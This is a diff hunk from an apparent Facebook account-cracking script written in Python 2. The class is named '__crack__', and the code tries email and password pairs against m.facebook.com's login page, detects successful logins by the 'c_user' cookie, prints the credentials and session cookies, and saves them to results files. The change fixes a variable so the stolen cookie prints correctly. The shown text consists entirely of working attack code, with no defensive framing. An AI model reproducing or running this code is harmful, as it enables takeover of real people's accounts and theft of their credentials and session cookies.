@@ -647,7 +647,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s[OK] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
+                print '\r %s[OK] %s • %s • %s                 %s' % (H,user,pw,coki,N)
                 wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
